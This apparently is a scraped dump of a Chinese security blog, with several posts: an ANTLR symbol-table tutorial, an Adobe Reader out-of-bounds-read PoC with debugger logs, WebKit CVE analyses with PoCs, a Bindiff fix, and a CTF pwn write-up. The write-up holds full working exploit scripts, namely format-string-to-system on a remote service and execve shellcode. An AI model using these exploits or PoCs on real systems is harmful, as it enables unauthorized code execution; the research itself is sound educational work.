因为作用域查找是往前找的，全局已经是最靠前了 Map&lt;String, Symbol&gt; symbols = new LinkedHashMap&lt;String, Symbol&gt;(); public BaseScope(Scope enclosingScope) { this.enclosingScope = enclosingScope; } public Symbol resolve(String name) { Symbol s = symbols.get(name); if ( s!=null ) return s;//在当前作用域找到了，直接返回 //如果临近作用域不空，那么就去临近作用域找 //比如，一个函数内，符号定义没找到，就去往上（全局）找 if ( enclosingScope != null ) return enclosingScope.resolve(name); //还找不到，那就是未定义，报错 return null; // not found } public void define(Symbol sym) { symbols.put(sym.name, sym); sym.scope = this; // track the scope in each symbol } public Scope getEnclosingScope() { return enclosingScope; } public String toString() { return getScopeName()+&quot;:&quot;+symbols.keySet().toString(); }} 3. 如何检查因为目标语言Cymbol允许向前引用，比如： 12345678int f(){ g();}void g(){ ;} 所以需要两次遍历，第一次找到所有定义，并放入符号表，将符号表构造好。接下来进行第二次遍历，这时遇到一个引用，就去找符号表，找到了就是正常，找不到就是有问题。 4. 代码主要是两个文件，DefPhase.java和RefPhase.java。 1. Defphase关键的问题：在第一次遍历构造符号表的时候，遇到新的作用域，需要把新的作用域的父作用域设置为当前作用域，并且把新的作用域设置为当前作用域。 对于遇到的变量定义直接使用对应的构造符号表的对象去构造就好了。 2. RefPhase遍历检查每个引用部分，去符号表里查找，找不到就报错。这部分比较简单。 3. checkSymbol1234567891011parser.setBuildParseTree(true);ParseTree tree = parser.file();// show tree in text form//System.out.println(tree.toStringTree(parser));ParseTreeWalker walker = new ParseTreeWalker();DefPhase def = new DefPhase();walker.walk(def, tree);// create next phase and feed symbol table info from def to ref phaseRefPhase ref = new RefPhase(def.globals, def.scopes);walker.walk(ref, tree); 5. 结果1234567891011121314151617181920212223242526272829# muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:46]$ antlr4 Cymbol.g4# muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:49]$ javac Cymbol*.java CheckSymbols.java *Phase.java *Scope.java *Symbol.java -Xlint:deprecationCheckSymbols.java:9: 警告: [deprecation] org.antlr.v4.runtime中的ANTLRInputStream已过时import org.antlr.v4.runtime.ANTLRInputStream; ^CheckSymbols.java:40: 警告: [deprecation] org.antlr.v4.runtime中的ANTLRInputStream已过时 ANTLRInputStream input = new ANTLRInputStream(is); ^CheckSymbols.java:40: 警告: [deprecation] org.antlr.v4.runtime中的ANTLRInputStream已过时 ANTLRInputStream input = new ANTLRInputStream(is); ^3 个警告# muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:56]$ java CheckSymbols vars.cymbollocals:[]function&lt;f:tINT&gt;:[&lt;x:tINT&gt;, &lt;y:tFLOAT&gt;]locals:[x, y]function&lt;g:tVOID&gt;:[]globals:[f, g]line 3:4 no such variable: iline 4:4 g is not a variableline 13:4 no such function: zline 14:4 y is not a functionline 15:8 f is not a variable 0x04： 引用《antlr4权威指南》","link":"/2018/05/29/Antlr4%E5%88%9D%E4%BD%93%E9%AA%8C/"},{"title":"Adobe Acrobat Reader getUIPerms&#x2F;setUIPerms  Unicode String Out-of-bound Read","text":"Unicode String Out-of-bound Read8月补丁被xlab撞了，索性就放出来了。 [TOC] 0x00 : PoCdoc对象的getUIPerms函数的越界读 1app.doc.getUIPerms({cFeatureName:\"\\xFE\\xFFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"}) 其实setUIPerms也能触发，但是参数和这个getUIPerms不太一样，但是核心问题都是一样的。 0x01 : Crash log1234567891011121314151617181920212223242526272829303132333435363738394041424344450:000&gt; g(2a70.388): Access violation - code c0000005 (!!! second chance !!!)eax=32d7cf00 ebx=0098cbd0 ecx=00000000 edx=32d7d000 esi=00000068 edi=7fffffffeip=59ca7675 esp=0098ca98 ebp=0098caa4 iopl=0 nv up ei ng nz ac pe cycs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010297EScript!mozilla::HashBytes+0x47e7f:59ca7675 8a02 mov al,byte ptr [edx] ds:002b:32d7d000=??0:000&gt; k10 # ChildEBP RetAddr WARNING: Stack unwind information not available. Following frames may be wrong.00 0098caa4 59c52b96 EScript!mozilla::HashBytes+0x47e7f01 0098cab8 59c545c4 EScript!PlugInMain+0x111902 0098cad8 59c54331 EScript!PlugInMain+0x2b4703 0098cb0c 59ca76d5 EScript!PlugInMain+0x28b404 0098cb24 59ca29f4 EScript!mozilla::HashBytes+0x47edf05 0098cb9c 59c93bb3 EScript!mozilla::HashBytes+0x431fe06 0098cbec 59c93912 EScript!mozilla::HashBytes+0x343bd07 0098cc64 59ca1f86 EScript!mozilla::HashBytes+0x3411c08 0098cce0 59c86d06 EScript!mozilla::HashBytes+0x4279009 0098cd54 59c8175d EScript!mozilla::HashBytes+0x275100a 0098d210 59c80606 EScript!mozilla::HashBytes+0x21f670b 0098d250 59c80517 EScript!mozilla::HashBytes+0x20e100c 0098d28c 59c80460 EScript!mozilla::HashBytes+0x20d210d 0098d2bc 59c68ec3 EScript!mozilla::HashBytes+0x20c6a0e 0098d304 59ca87ac EScript!mozilla::HashBytes+0x96cd0f 0098d380 59ca84ec EScript!mozilla::HashBytes+0x48fb60:000&gt; dd edx-1032d7cff0 41414141 41414141 41414141 d000414132d7d000 ???????? ???????? ???????? ????????32d7d010 ???????? ???????? ???????? ????????32d7d020 ???????? ???????? ???????? ????????32d7d030 ???????? ???????? ???????? ????????32d7d040 ???????? ???????? ???????? ????????32d7d050 ???????? ???????? ???????? ????????32d7d060 ???????? ???????? ???????? ????????0:000&gt; dd edx-0x8032d7cf80 00000067 00001000 00000000 0000000032d7cf90 0475f34c dcbabbbb 4141fffe 4141414132d7cfa0 41414141 41414141 41414141 4141414132d7cfb0 41414141 41414141 41414141 4141414132d7cfc0 41414141 41414141 41414141 4141414132d7cfd0 41414141 41414141 41414141 4141414132d7cfe0 41414141 41414141 41414141 4141414132d7cff0 41414141 41414141 41414141 d0004141 参数是 \\xFE\\xFF\\x41414141..... edx指向参数 0x02 : Analysis读unicode字符串函数，是没有问题的，应该是上层逻辑的问题，没有做充分的判断，导致用读unicode string的逻辑去读取了ascii string 。 这就导致，读取了更多的数据，然后就oob了。 12345678910unsigned int __cdecl sub_23802B75(char *a1, unsigned int a2, void (__cdecl *a3)(const wchar_t *, const wchar_t *, const wchar_t *, unsigned int, uintptr_t)){ unsigned int result; // eax if ( a1 &amp;&amp; *a1 == 0xFEu &amp;&amp; a1[1] == 0xFFu ) result = sub_2385763B(a1, a2, a3); // unicode else result = sub_23802BA9(a1, a2, a3); // ascii string return result;} 调试，漏洞发生时参数信息如下： 可以看到，传入的参数并不是unicode string，但是却按照unicode string的代码逻辑去读，所以就越界了。 上一层逻辑中，我们看到，对于读取字符串的逻辑来说，只简单的检查了： 字符串是否有效 字符串开头是否是\\xFE\\xFF 满足2，就走unicode逻辑 不满足就走ascii逻辑 但是这里应该不是root cause，而且这部分底层逻辑也没啥问题，应该是上层的逻辑出了问题，导致下层代码执行时候崩溃。 问题出在 app.doc.getUIPerms() 函数实现，在参数传递的时候，参数处理考虑不周导致。 需要找这个对象注册方法的地方，找了一圈，发现这个方法的实现在DigSig.api中。 12340:000&gt; da poi(esp+8)553dfbbc &quot;getUIPerms&quot;0:000&gt; ln poi(esp+c)(55311705) DigSig!PlugInMain+0x48f3a | (55311705) DigSig!PlugInMain 但是调试发现，根本没有触发到这里的代码逻辑。 追踪堆内存 12345678910111213141516171819202122232425262728293031323334353637 address 46df9f98 found in _DPH_HEAP_ROOT @ 5c91000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 471b1820: 46df9f98 67 - 46df9000 2000 5a52abb0 verifier!VerifierDisableFaultInjectionExclusionRange+0x000034c0 7707246b ntdll!RtlDebugAllocateHeap+0x00000039 76fd6dd9 ntdll!RtlpAllocateHeap+0x000000f9 76fd5ec9 ntdll!RtlpAllocateHeapInternal+0x00000179 76fd5d3e ntdll!RtlAllocateHeap+0x0000003e*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Windows\\System32\\ucrtbase.dll - 74840106 ucrtbase!malloc_base+0x00000026 5782a2bc AcroRd32!AXWasInitViaPDFL+0x000008cf 5782e829 AcroRd32!CTJPEGLibInit+0x00002039 542245d8 EScript!PlugInMain+0x00002b5b //this will call alloc func 54224331 EScript!PlugInMain+0x000028b4 542776d5 EScript!mozilla::HashBytes+0x00047edf 542729f4 EScript!mozilla::HashBytes+0x000431fe 54263bb3 EScript!mozilla::HashBytes+0x000343bd 54263912 EScript!mozilla::HashBytes+0x0003411c 54271f86 EScript!mozilla::HashBytes+0x00042790 54256d06 EScript!mozilla::HashBytes+0x00027510 5425175d EScript!mozilla::HashBytes+0x00021f67 54250606 EScript!mozilla::HashBytes+0x00020e10 54250517 EScript!mozilla::HashBytes+0x00020d21 54250460 EScript!mozilla::HashBytes+0x00020c6a 54238ec3 EScript!mozilla::HashBytes+0x000096cd 542787ac EScript!mozilla::HashBytes+0x00048fb6 542784ec EScript!mozilla::HashBytes+0x00048cf6 542780e5 EScript!mozilla::HashBytes+0x000488ef 542770b4 EScript!mozilla::HashBytes+0x000478be 542e85e9 EScript!double_conversion::DoubleToStringConverter::CreateDecimalRepresentation+0x00061731 5803da6f AcroRd32!AIDE::PixelPartInfo::operator=+0x0010536f 57f6723a AcroRd32!AIDE::PixelPartInfo::operator=+0x0002eb3a 57f6345e AcroRd32!AIDE::PixelPartInfo::operator=+0x0002ad5e 57d3002d AcroRd32!AX_PDXlateToHostEx+0x001ff9b5 57d3057c AcroRd32!AX_PDXlateToHostEx+0x001fff04 57f66e8e AcroRd32!AIDE::PixelPartInfo::operator=+0x0002e78e callstack 和 堆追踪 得到的结果 前部分重合，内存在 这个call里分配，这个call一直到核心dll再到ntdll去分配内存。 分析的参数来源发现： 123456789101112131415161718else if ( a3 == 2 ) { v17 = (*(int (__cdecl **)(_DWORD, void *))(dword_23A65354 + 0x60))(*v4, Src);// // // 0:000&gt; dd 4bc86fe8 // 4bc86fe8 000000cc 4f6d0f30 00000000 00000000 // 4bc86ff8 00000000 00000000 ???????? ???????? // 4bc87008 ???????? ???????? ???????? ???????? // 4bc87018 ???????? ???????? ???????? ???????? // 4bc87028 ???????? ???????? ???????? ???????? // 4bc87038 ???????? ???????? ???????? ???????? // 4bc87048 ???????? ???????? ???????? ???????? // 4bc87058 ???????? ???????? ???????? ???????? // // length str // // unicode str--&gt; ascii str } 这个调用对数据作处理，输入数据： 1234567891011121314151617180:000&gt; dd 4f6d0f30 4f6d0f30 00ff00fe 00410041 00410041 004100414f6d0f40 00410041 00410041 00410041 004100414f6d0f50 00410041 00410041 00410041 004100414f6d0f60 00410041 00410041 00410041 004100414f6d0f70 00410041 00410041 00410041 004100414f6d0f80 00410041 00410041 00410041 004100414f6d0f90 00410041 00410041 00410041 004100414f6d0fa0 00410041 00410041 00410041 004100410:000&gt; dd 4f6d0f30 + 0xcc4f6d0ffc d0d00000 ???????? ???????? ????????4f6d100c ???????? ???????? ???????? ????????4f6d101c ???????? ???????? ???????? ????????4f6d102c ???????? ???????? ???????? ????????4f6d103c ???????? ???????? ???????? ????????4f6d104c ???????? ???????? ???????? ????????4f6d105c ???????? ???????? ???????? ????????4f6d106c ???????? ???????? ???????? ???????? 得到的结果是: 12345678910110:000&gt; r eaxeax=4b9cef980:000&gt; dd eax4b9cef98 4141fffe 41414141 41414141 414141414b9cefa8 41414141 41414141 41414141 414141414b9cefb8 41414141 41414141 41414141 414141414b9cefc8 41414141 41414141 41414141 414141414b9cefd8 41414141 41414141 41414141 414141414b9cefe8 41414141 41414141 41414141 414141414b9ceff8 41414141 d0004141 ???????? ????????4b9cf008 ???????? ???????? ???????? ???????? 然后直接把这个buffer为参数传递给处理函数（此时这是一个ascii string) 123456789101112131415160:000&gt; pBreakpoint 2 hiteax=4b9cef98 ebx=0098cec4 ecx=00000000 edx=7fffff99 esi=4b9cef98 edi=0098ce4ceip=529145bf esp=0098ce10 ebp=0098ce28 iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000202EScript!PlugInMain+0x2b42:529145bf e8b1e5ffff call EScript!PlugInMain+0x10f8 (52912b75)0:000&gt; dd esi4b9cef98 4141fffe 41414141 41414141 414141414b9cefa8 41414141 41414141 41414141 414141414b9cefb8 41414141 41414141 41414141 414141414b9cefc8 41414141 41414141 41414141 414141414b9cefd8 41414141 41414141 41414141 414141414b9cefe8 41414141 41414141 41414141 414141414b9ceff8 41414141 d0004141 ???????? ????????4b9cf008 ???????? ???????? ???????? ???????? 处理函数判断是不是unicode，只是判断前两个字符是不是\\xFE\\xFF，就走了unicode逻辑，所以导致越界读。 0x03 : what is root cause其实就是上层一点的逻辑对输入的参数没做转换(to unicode)，导致后面获取长度的函数处理字符串的时候，误认为\\xFE\\xFF开头的就是unicode字符串，然后就越界读取了。 0x04 : 🤔几个月前写的分析了，可能会有错误，有问题欢迎和我沟通 : -) 这个攻击面可能就这么一点一点的消失了吧 :-)","link":"/2019/08/14/Adobe-Acrobat-Reader-getUIPerms-setUIPerms-Unicode-String-Out-of-bound-Read/"},{"title":"Bindiff5.0 Could not create file handler fix","text":"0x00 : 问题升级Mojave后(这事儿Mojave不背锅)， bindiff5.0 工作一直有问题： Failed to initalize file logger. Could not create file handler 今天总算搞定了这个问题，记录一下过程。 0x01 : 尝试过程 重装ida 和 bindiff。 ❌ Java环境问题？ ❌ 后来发现是日志文件的问题，正常情况下，你的日志是在: /Users/YOUR_USER_NAME/Library/Application Support/.bindiff 有意思的情况是，如果你之前装过其他版本的bindiff，卸载后这个目录并不会被删除，这就导致了后面高版本bindiff出现一开始的问题。笔者就是之前用ida6.8，配合bindiff4.3，所以出现了这个问题。 0x02 : 解决方案1sudo rm -rf /Users/YOUR_USER_NAME/Library/Application Support/.bindiff 重新安装bindiff5.0 问题解决！happy diff， happy bug hunting！","link":"/2019/08/22/Bindiff5-0-Could-not-create-file-handler-fix/"},{"title":"Baiudu杯 pwn专场记录","text":"前言十一月的第一周，百度杯的pwn专场，就去学习了下姿势，更加认识到自己的不足和问题所在，以后努力更正改进~本次比赛一共是3个misc和三个pwn，题目都不难，pwn好像有两个都是原题，但是我只google到了第二个题目… 1.pwnme格式化字符串(x64) 其实后面还有个bof，fmt和bof的结合可能才是出题人的本意吧(我猜的)。 12345678$ checksec pwnme [!] Couldn't find relocations against PLT to get symbols[*] '/home/muhe/Desktop/baidu-pwn1/pwnme' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE 格式化字符串在输出name和pass的时候会导致这个格式化字符串，可以任意地址读写。 但是需要注意 x64中fmt 泄露的参数的顺序( RDI-RDX-RCX-R8-R9-stack[0]-stack[1]......) 因为有00截断，所以要格式化的地址放后面( -。- 没错 后入式) 本来以为开了 Full RELRO 的情况下 DynELF就不行了，还想着手动去解析出libc基地址然后再搞呢…改了下方式就可以了。在师傅的指导下完成了leak的部分，然后是使用DynELF去泄露system的地址，后面改返回地址为system，然后设置好参数后，ret过去。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104# -*-coding:utf-8-*-from pwn import *# based on joker 's exploitr = remote(\"106.75.84.74\", 10001)#pwn#r = remote(\"127.0.0.1\", 10001)#pwn#context.log_level = \"debug\"read_got = 0x0000000000601FC8pop_rdi_ret = 0x0000000000400ed3pppr = 0x000000000400ECE#ret addr 0x0000000000400e56def leak(addr): r.recvuntil(\"&gt;\") r.sendline(\"2\") r.recvuntil(\"20):\") payload = \"aaaa\" r.sendline(payload) r.recvuntil(\"20):\") payload = \"%12$s\"+\"AAAAAAA\" + p64(addr) r.send(payload) r.recvuntil(\"&gt;\") r.sendline(\"1\") content = r.recvuntil(\"AAAAAAA\") if(len(content) == 12): print \"[*] NULL \" return '\\x00' else: print \"[*]%#x -- &gt; %s\" % (addr,(content[5:-7] or '').encode('hex')) return content[5:-7]#writebytedef writebyte(count_byte,addr): r.recvuntil(\"&gt;\") r.sendline(\"2\") r.recvuntil(\"20):\") payload = \"aaaa\" r.sendline(payload) r.recvuntil(\"20):\") payload = \"%{0}c%12$hhn\".format(count_byte) payload += \"A\"*(12-len(payload)) + p64(addr) r.send(payload) r.recvuntil(\"&gt;\") r.sendline(\"1\") r.recvuntil(\"\\n\")r.recvuntil(\"40):\")r.sendline(\"aaa\")r.recvuntil(\"40):\")r.sendline(\"aaa\")d = DynELF(leak,elf=ELF('./pwnme'))system_addr = d.lookup('system','libc')print \"[*] system addr:{0}\".format(hex(system_addr))#leak ret_addrr.recvuntil(\"&gt;\")r.sendline(\"2\")r.recvuntil(\"20):\")payload = \"aaaa\"r.sendline(payload)r.recvuntil(\"20):\")payload = \"%6$s\" #stackr.send(payload)r.recvuntil(\"&gt;\")r.sendline(\"1\")r.recvuntil(\"\\n\")content = r.recv(6)content = content.ljust(8,\"\\x00\")stack_addr = u64(content) # 0x7ffc23fb85e0stack_while_ret_addr = stack_addr + 8 - 0xb0 #print \"[*] stack_while_ret addr:{0}\".format(hex(stack_while_ret_addr))#leak_ret_addr'''0000| 0x7ffc23fb84f0 --&gt; 0x7ffc23fb8530 --&gt; 0x7ffc23fb85e0 --&gt; 0x400e70 (push r15)0008| 0x7ffc23fb84f8 --&gt; 0x400d32 (add rsp,0x30)0016| 0x7ffc23fb8500 --&gt; 0xa61616161 ('aaaa\\n')0024| 0x7ffc23fb8508 --&gt; 0x0 0032| 0x7ffc23fb8510 --&gt; 0x7324362500000000 ('')0040| 0x7ffc23fb8518 --&gt; 0x0 0048| 0x7ffc23fb8520 --&gt; 0x0 0056| 0x7ffc23fb8528 --&gt; 0x400d0b (cmp eax,0x2)'''writebyte(0xce,stack_while_ret_addr)writebyte(system_addr &amp; 0xff,stack_while_ret_addr + 0x30)writebyte((system_addr &gt;&gt; 8) &amp; 0xff,stack_while_ret_addr + 0x30 + 1)writebyte((system_addr &gt;&gt; 16) &amp; 0xff,stack_while_ret_addr + 0x30 + 2)writebyte((system_addr &gt;&gt; 24) &amp; 0xff,stack_while_ret_addr + 0x30 + 3)writebyte((system_addr &gt;&gt; 32) &amp; 0xff,stack_while_ret_addr + 0x30 + 4)writebyte((system_addr &gt;&gt; 40) &amp; 0xff,stack_while_ret_addr + 0x30 + 5)print r.recvuntil(\"&gt;\")r.sendline(\"2\")print r.recvuntil(\"20):\")payload = \"/bin/sh;\" + \"AAAAAAAABBB\"r.sendline(payload)print r.recvuntil(\"20):\")payload = \"\\x00\\x00\\x00\\x00\" + p64(pop_rdi_ret) + p64(stack_while_ret_addr + 8)#raw_input('$ret')r.send(payload)print r.recvuntil(\"&gt;\")r.sendline('3')r.interactive() 2.loading简单粗暴把输入的每个字节 /2333.0 然后直接执行 浮点数的考察啊…google了下 float shellcode，就找到了原题啊…把别人exp里的1337.0改成2333.0就好了…搜到了pctf 2016 fixedpoint writeup还有这个 PlaidCTF 2016 fixedpoint pctf 这个的源码,简直不要再一样好么。 123456789101112131415161718#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;stdio.h&gt;int main(int argc, char** argv) { float* array = mmap(0, sizeof(float)*8192, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0); int i; int temp; float ftemp; for (i = 0; i &lt; 8192; i++) { if (!scanf(\"%d\", &amp;temp)) break; array[i] = ((float)temp)/1337.0; } write(1, \"here we go\\n\", 11); (*(void(*)())array)();} 附上exploit 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import structimport ctypesfrom pwn import *shellcode = [\"\\x31\\xc9\", # xor ecx, ecx \"\\xf7\\xe1\", # mul ecx \"\\x51\", # push ecx \"\\xb1\\xff\", # mov cl, 0xFF \"\\xb5\\xff\", # mov ch, 0xFF \"\\x41\", # inc ecx \"\\xb4\\x68\", # mov ah, 0x68 \"\\xb0\\x73\", # mov al, 0x73 \"\\xf7\\xe1\", # mul ecx \"\\xb4\\x2f\", # mov ah, 0x2F \"\\xb0\\x2f\", # mov al, 0x2F \"\\x50\", # push eax \"\\xb4\\x6e\", # mov ah, 0x6e \"\\xb0\\x69\", # mov al, 0x69 \"\\xf7\\xe1\", # mul ecx \"\\xb4\\x62\", # mov ah, 0x62 \"\\xb0\\x2f\", # mov al, 0x2F \"\\x50\", # push eax \"\\x31\\xc0\", # xor eax, eax \"\\x31\\xd2\", # xor edx, edx \"\\x31\\xc9\", # xor ecx, ecx \"\\x89\\xe3\", # mov ebx, esp \"\\xb0\\x0b\", # mov al, 11 \"\\xcd\\x80\"] # int 0x80ints_to_send = []for instr in shellcode: z = \"\\x40\" if len(instr) == 1: z = \"\\x90\\x40\" payload = \"\\x48\" + instr[::-1] + z a = struct.unpack(\"&gt;f\", payload)[0]*2333 if a &gt; 2147483647: log.error(\"It's too large fam.\") b = str(\"{0:f}\".format(a)).split(\".\")[0] log.info(b + \" \" + payload.encode(\"hex\")) ints_to_send.append(b)r = remote(\"106.75.84.68\", 20000)for i in ints_to_send: r.sendline(i)r.interactive() 感言这个比赛让我感觉收获最大的应该是“思考”:要学会自己思考，不然做再多题目都没有用。","link":"/2016/11/07/Baiudu%E6%9D%AF-pwn%E4%B8%93%E5%9C%BA%E8%AE%B0%E5%BD%95/"},{"title":"CVE-2017-2536 analysis","text":"0x00 : 前置知识 interpreter解释器 (LLint) DFG JIT全称 data flow graph JIT 数据流图 JIT。是一种推测优化的技术。会开始对一个类型做出一个能够对性能好的假设，先编译一个版本，如果后面发现假设不对就会跳转回原先代码，称为 Speculation failure。DFG 是并发编译器，DFG pipeline 的每个部分都是同时运行的，包括字节码解析和分析。 FLT JIT新的一层 FTL 实际上是 DFG Backend 的替换。会先在 DFG 的 JavaScript 函数表示转换为静态单一指派（SSA） 格式上做些 JavaScript 特性的优化。接着把 DFG IR 转换成 FTL 里用到的 B3 的 IR。最后生成机器码。 总的来说过程就是把源码生成字节码，接着变成 DFG CPS IR，再就是 DFG SSA IR，最后成 B3 的 IR，JavaScript 的动态性就是在这些过程中一步步被消除掉的。 首先了解 javascript展开语法: 1234ES6的新特性: 展开语法(Spread syntax), 可以在函数调用/数组构造时, 将数组表达式或者string在语法层面展开； 还可以在构造字面量对象时, 将对象表达式按key-value的方式展开。 (译者注: 字面量一般指 [1, 2, 3] 或者 {name: &quot;mdn&quot;} 这种简洁的构造方式) 123var a = [1, 2, 3];console.log(...a);// 1 2 3 0x01 : 漏洞信息经典的jit洞 git commit : 61dbb71d92f6a9e5a72c5f784eb5ed11495b3ff7 12let a = new Array(0x7fffffff);let hax = [13, 37, ...a, ...a]; PoC中，hax数组的长度，需要计算，根据展开array a去计算，jit中这部分实现出了问题。 0x02 : 漏洞分析Exploiting an integer overflow with array spreading (WebKit) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748SLOW_PATH_DECL(slow_path_new_array_with_spread){ BEGIN(); int numItems = pc[3].u.operand; ASSERT(numItems &gt;= 0); const BitVector&amp; bitVector = exec-&gt;codeBlock()-&gt;unlinkedCodeBlock()-&gt;bitVector(pc[4].u.unsignedValue); JSValue* values = bitwise_cast&lt;JSValue*&gt;(&amp;OP(2)); // 计算array size // poc 中的 hax array unsigned arraySize = 0; for (int i = 0; i &lt; numItems; i++) { if (bitVector.get(i)) { JSValue value = values[-i]; JSFixedArray* array = jsCast&lt;JSFixedArray*&gt;(value); arraySize += array-&gt;size(); } else arraySize += 1; } JSGlobalObject* globalObject = exec-&gt;lexicalGlobalObject(); Structure* structure = globalObject-&gt;arrayStructureForIndexingTypeDuringAllocation(ArrayWithContiguous); JSArray* result = JSArray::tryCreateForInitializationPrivate(vm, structure, arraySize); CHECK_EXCEPTION(); // 根据计算的size，分配空间 unsigned index = 0; for (int i = 0; i &lt; numItems; i++) { JSValue value = values[-i]; if (bitVector.get(i)) { // We are spreading. JSFixedArray* array = jsCast&lt;JSFixedArray*&gt;(value); for (unsigned i = 0; i &lt; array-&gt;size(); i++) { RELEASE_ASSERT(array-&gt;get(i)); result-&gt;initializeIndex(vm, index, array-&gt;get(i)); ++index; } } else { // We are not spreading. result-&gt;initializeIndex(vm, index, value); ++index; } } RETURN(result);} size 是一个 unsigned ，可以整数溢出。JSObject::initializeIndex无任何边界检查： 12345678910/* ... */case ALL_CONTIGUOUS_INDEXING_TYPES: { ASSERT(i &lt; butterfly-&gt;publicLength()); ASSERT(i &lt; butterfly-&gt;vectorLength()); butterfly-&gt;contiguous()[i].set(vm, this, v); break;}/* ... */ 所以poc按照以上代码逻辑之行的话，会分配一个size是0的array，但是却拷贝了 2147483647 * 2 + 2 即 0x7fffffff * 2 + 2 个数据进去，导致堆溢出。 看commit1git log -g --grep=&quot;169780&quot; 或者直接sourcetree搜索 这个洞在三个jit阶段都有体现，所以补了多个地方：LLint, DFG JIT, FTL JIT 基本上都是，计算新array的length从简单粗暴的计算，改成增加了length check的计算。 0x03 : 利用 TODO 0x04 : 参考Exploiting an integer overflow with array spreading (WebKit) 深入剖析 WebKit","link":"/2019/03/24/CVE-2017-2536-analysis/"},{"title":"CVE-2016-4622  analysis","text":"0x00 : Vuln infoVuln : Out-Of-Bound ReadWebkit Version : 320b1fcSource Code : ArrayPrototype.cpp 的slice部分逻辑 1git checkout -b CVE-2016-4662 320b1fc 0x01 : PoC123456var a = [];for (var i = 0; i &lt; 100; i++) a.push(i + 0.123);var b = a.slice(0, {valueOf: function() { a.length = 0; return 10; }});// b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0] 0x02 : AnalysisPoC 分析123456var a = [];for (var i = 0; i &lt; 100; i++) a.push(i + 0.123);var b = a.slice(0, {valueOf: function() { a.length = 0; return 10; }});// b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0] 原本想要做的是：从a array中取前十个元素，放入b array中。 漏洞成因slice对应分片操作，这里b数组的值是取的a数组的前十个元素，但是这里取的时候，valueOf这个回调修改掉了a数组的长度；然而，在发生拷贝操作的时候，slice的实现函数并没有检查长度，就直接拷贝了数据，这就导致b数组取的时候访问到了a数组以外的内存，所以可以看到b数组的内容是：[0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]从0.123之后都是其他数据，此时已经发生了越界读。 root cause : 拷贝前未做长度检查 未patch的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec){ JSObject* thisObj = exec-&gt;thisValue() .toThis(exec, StrictMode) .toObject(exec); if (!thisObj) return JSValue::encode(JSValue()); unsigned length = getLength(exec, thisObj); if (exec-&gt;hadException()) return JSValue::encode(jsUndefined()); unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length); unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length); std::pair&lt;SpeciesConstructResult, JSObject*&gt; speciesResult = speciesConstructArray(exec, thisObj, end - begin); if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception)) return JSValue::encode(jsUndefined());// 执行切片操作，但是没有任何检查 if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp; isJSArray(thisObj))) { if (JSArray* result = asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin)) return JSValue::encode(result); } JSObject* result; if (speciesResult.first == SpeciesConstructResult::CreatedObject) result = speciesResult.second; else result = constructEmptyArray(exec, nullptr, end - begin); unsigned n = 0; for (unsigned k = begin; k &lt; end; k++, n++) { JSValue v = getProperty(exec, thisObj, k); if (exec-&gt;hadException()) return JSValue::encode(jsUndefined()); if (v) result-&gt;putDirectIndex(exec, n, v); } setLength(exec, result, n); return JSValue::encode(result);} 0x03 : Exploit这里不再赘述，原文作者写的很详细，我也是跟着他的文章调试学习的。 利用思路： 信息泄漏 伪造对象(Fload64Array) 任意地址读写 读取一个function obj的地址，触发JIT生成RWX的代码 利用任意地址读写写入shellcode 执行function 0x04: 后续1. how to find this bug？​ 代码审计就不说了，主要是关注在一些敏感函数前后的check情况，比如复制操作，拼接操作等。 ​ Fuzz的话，生成式和变异式都很容易覆盖到这个case，并没有很难，只是这个洞是一种模式的问题，所以在写fuzz的规则或者模版的时候要多注意。所以在看洞的时候要思考，这是一个模式的问题，还是个例。 2. 其他类似的bug​ runtime中利用slide-effect来修改一些对象类型、长度等信息，来触发一些类型混淆、越界的情况很多，不仅仅在jsc引擎，但是这些基本已经成为历史了。 这种类型的漏洞，在2016年keen lab 在poc的议题中提到了很多，其中也有类似4622这个洞的一些其他漏洞。 3. 关于调试这个洞新版本的macos上编译有点麻烦，需要老版sdk，不想折腾的，直接装老版本的macOS虚拟机就行，这是最简单的办法；如果你选择自己编译，慢慢修错误吧。。问题太多了。 如果调洞，Linux也可以，直接build-jsc-only就好了。 lldb调试的话，推荐Voltron插件，同时推荐我写的tmux脚本。 0x05:引用攻击JavaScript引擎：一个JavaScriptCore的学习案例(CVE-2016-4622 (2016-10-27)) attacking_javascript_engines","link":"/2019/04/06/CVE-2016-4622-analysis/"},{"title":"CVE-2017-2541 __XGetWindowMovementGroup stackoverflow","text":"basic infosize用户可控，array操作时栈溢出。macOS 10.12.1 vuln12345678910111213141516171819202122232425262728293031323334353637383940414243void __fastcall get_window_group_list(__int64 a1, __int64 a2, unsigned int a3, __int64 a4, unsigned int *a5){ unsigned int *total_length; // r14 __int64 buffer_1; // rbx unsigned int size_param; // er15 __int64 v8; // rax __int64 v9; // r12 unsigned int length; // eax __int64 